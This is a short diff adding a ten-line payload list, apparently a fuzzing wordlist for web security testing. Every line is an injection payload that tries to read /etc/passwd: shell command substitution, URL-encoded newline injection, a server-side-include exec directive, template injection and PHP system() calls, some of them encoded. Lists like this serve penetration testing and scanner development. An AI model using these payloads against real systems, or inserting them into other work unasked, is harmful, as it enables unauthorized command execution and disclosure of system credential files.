@@ -1,0 +1,10 @@
+$(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+%0Acat%20/etc/passwd
+;system('cat%20/etc/passwd')
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
